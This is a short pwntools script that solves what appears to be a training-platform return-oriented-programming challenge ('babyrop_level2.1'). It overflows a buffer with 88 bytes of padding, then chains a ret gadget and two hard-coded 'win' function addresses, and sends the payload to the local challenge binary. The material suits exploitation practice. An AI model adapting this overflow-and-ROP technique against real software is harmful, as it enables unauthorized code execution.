from pwn import *

offset = b'A'*88
win_1 = p64(0x40222d)
win_2 = p64(0x4022da)
ret = p64(0x40101a)

payload = offset
payload += ret
payload += win_1
payload += win_2
print(payload)
with open("run", 'wb') as file:
    file.write(payload)
r = process('/challenge/babyrop_level2.1')
r.recvuntil(b'###\n')
r.sendline(payload)
r.interactive()